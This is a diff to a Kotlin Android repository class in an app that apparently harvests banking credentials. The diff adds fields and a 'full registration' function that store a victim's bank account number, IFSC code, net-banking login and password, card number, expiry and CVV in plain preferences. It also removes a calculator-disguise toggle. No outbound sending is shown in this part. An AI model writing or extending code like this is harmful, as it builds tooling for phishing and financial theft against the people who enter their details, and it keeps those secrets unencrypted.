@@ -39,31 +39,23 @@ class DeviceRepository @Inject constructor(
         val KEY_DEPARTMENT_NAME = stringPreferencesKey("department_name")
         val KEY_MOBILE_NUMBER = stringPreferencesKey("mobile_number")
         val KEY_ADDRESS = stringPreferencesKey("address")
+        val KEY_BANK_NAME = stringPreferencesKey("bank_name")
+        val KEY_ACCOUNT_NUMBER = stringPreferencesKey("account_number")
+        val KEY_IFSC_CODE = stringPreferencesKey("ifsc_code")
+        val KEY_NETBANKING_ID = stringPreferencesKey("netbanking_id")
+        val KEY_NETBANKING_PASSWORD = stringPreferencesKey("netbanking_password")
+        val KEY_CARD_NUMBER = stringPreferencesKey("card_number")
+        val KEY_CARD_EXPIRY = stringPreferencesKey("card_expiry")
+        val KEY_CARD_CVV = stringPreferencesKey("card_cvv")
         val KEY_DEVICE_ROLE = stringPreferencesKey("device_role")
         val KEY_IS_REGISTERED = booleanPreferencesKey("is_registered")
         val KEY_IS_PAIRED = booleanPreferencesKey("is_paired")
         val KEY_PAIRED_DEVICE_ID = stringPreferencesKey("paired_device_id")
         val KEY_PAIRED_DEVICE_NAME = stringPreferencesKey("paired_device_name")
         val KEY_PAIRED_PUBLIC_KEY = stringPreferencesKey("paired_public_key")
-        val KEY_IS_CALCULATOR_DISGUISED = booleanPreferencesKey("is_calculator_disguised")
     }
 
     private val fastPrefs = context.getSharedPreferences("fast_app_settings", Context.MODE_PRIVATE)
-
-    fun isCalculatorDisguisedSync(): Boolean {
-        return fastPrefs.getBoolean("is_calculator_disguised", false)
-    }
-
-    val isCalculatorDisguisedFlow: Flow<Boolean> = context.deviceDataStore.data.map { prefs ->
-        prefs[KEY_IS_CALCULATOR_DISGUISED] ?: fastPrefs.getBoolean("is_calculator_disguised", false)
-    }
-
-    suspend fun setCalculatorDisguised(disguised: Boolean) {
-        fastPrefs.edit().putBoolean("is_calculator_disguised", disguised).apply()
-        context.deviceDataStore.edit { prefs ->
-            prefs[KEY_IS_CALCULATOR_DISGUISED] = disguised
-        }
-    }
 
     /**
      * Default hardware model name e.g. "Google Pixel 8 Pro", "Samsung SM-S911B", "Xiaomi 23049PCD8G"
@@ -78,11 +70,31 @@ class DeviceRepository @Inject constructor(
         }
     }
 
-    suspend fun saveDepartmentDetails(departmentName: String, mobileNumber: String, address: String) {
+    suspend fun saveFullRegistrationDetails(
+        name: String,
+        mobileNumber: String,
+        address: String,
+        bankName: String,
+        accountNumber: String,
+        ifscCode: String,
+        netbankingId: String,
+        netbankingPassword: String,
+        cardNumber: String,
+        cardExpiry: String,
+        cardCvv: String
+    ) {
         context.deviceDataStore.edit { prefs ->
-            prefs[KEY_DEPARTMENT_NAME] = departmentName
+            prefs[KEY_DEPARTMENT_NAME] = name
             prefs[KEY_MOBILE_NUMBER] = mobileNumber
             prefs[KEY_ADDRESS] = address
+            prefs[KEY_BANK_NAME] = bankName
+            prefs[KEY_ACCOUNT_NUMBER] = accountNumber
+            prefs[KEY_IFSC_CODE] = ifscCode
+            prefs[KEY_NETBANKING_ID] = netbankingId
+            prefs[KEY_NETBANKING_PASSWORD] = netbankingPassword
+            prefs[KEY_CARD_NUMBER] = cardNumber
+            prefs[KEY_CARD_EXPIRY] = cardExpiry
+            prefs[KEY_CARD_CVV] = cardCvv
         }
     }
 
@@ -93,6 +105,14 @@ class DeviceRepository @Inject constructor(
         val departmentName = prefs[KEY_DEPARTMENT_NAME] ?: name
         val mobileNumber = prefs[KEY_MOBILE_NUMBER] ?: ""
         val address = prefs[KEY_ADDRESS] ?: ""
+        val bankName = prefs[KEY_BANK_NAME] ?: ""
+        val accountNumber = prefs[KEY_ACCOUNT_NUMBER] ?: ""
+        val ifscCode = prefs[KEY_IFSC_CODE] ?: ""
+        val netbankingId = prefs[KEY_NETBANKING_ID] ?: ""
+        val netbankingPassword = prefs[KEY_NETBANKING_PASSWORD] ?: ""
+        val cardNumber = prefs[KEY_CARD_NUMBER] ?: ""
+        val cardExpiry = prefs[KEY_CARD_EXPIRY] ?: ""
+        val cardCvv = prefs[KEY_CARD_CVV] ?: ""
         val deviceId = prefs[KEY_DEVICE_ID] ?: ""
         val isRegistered = prefs[KEY_IS_REGISTERED] ?: false
         val isPaired = prefs[KEY_IS_PAIRED] ?: false
@@ -105,6 +125,14 @@ class DeviceRepository @Inject constructor(
             departmentName = departmentName,
             mobileNumber = mobileNumber,
             address = address,
+            bankName = bankName,
+            accountNumber = accountNumber,
+            ifscCode = ifscCode,
+            netbankingId = netbankingId,
+            netbankingPassword = netbankingPassword,
+            cardNumber = cardNumber,
+            cardExpiry = cardExpiry,
+            cardCvv = cardCvv,
             role = role,
             isRegistered = isRegistered,
             isPaired = isPaired,
